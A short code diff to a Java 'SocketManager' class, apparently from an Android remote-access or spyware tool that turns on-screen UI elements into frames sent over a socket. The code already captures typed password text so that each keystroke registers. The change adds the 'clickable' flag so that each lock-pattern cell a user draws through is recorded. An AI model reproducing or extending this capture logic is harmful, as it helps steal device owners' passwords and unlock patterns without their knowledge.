@@ -1712,9 +1712,13 @@ public class SocketManager {
                       .append(el.optString("hintText", ""))
                       // Include passwordText so every password keystroke registers as a new frame
                       .append(el.optString("passwordText", ""))
-                      .append(el.optBoolean("checked",  false) ? "C" : "")
-                      .append(el.optBoolean("selected", false) ? "S" : "")
-                      .append(el.optBoolean("enabled",  true)  ? "" : "D");
+                      .append(el.optBoolean("checked",   false) ? "C" : "")
+                      .append(el.optBoolean("selected",  false) ? "S" : "")
+                      .append(el.optBoolean("enabled",   true)  ? "" : "D")
+                      // Include clickable so pattern-cell touches register as distinct frames.
+                      // When a cell is drawn through it loses its clickable flag — that state
+                      // change must survive the save-deduplication step.
+                      .append(el.optBoolean("clickable", false) ? "K" : "");
                     JSONObject b = el.optJSONObject("bounds");
                     if (b != null) sb.append('@').append(b.optInt("top", 0));
                 }
